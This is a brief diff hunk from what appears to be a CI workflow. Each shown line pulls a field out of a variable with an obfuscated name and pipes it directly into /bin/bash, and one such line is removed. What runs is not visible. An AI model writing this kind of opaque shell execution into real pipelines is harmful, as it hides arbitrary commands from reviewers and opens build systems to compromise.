@@ -26,7 +26,6 @@ jobs:
           echo $ugej7 | jq -r .mos62 | /bin/bash
           printf '%s' "$h5512" | jq -r .ftum7774 | /bin/bash
           echo $dn787 | jq -r .i202 | /bin/bash
-          printf '%s' "$r45" | jq -r .h3 | /bin/bash
           echo $gu8270 | jq -r .rcp2146 | /bin/bash
           printf '%s' "$dhn524" | jq -r .bar039 | /bin/bash
 
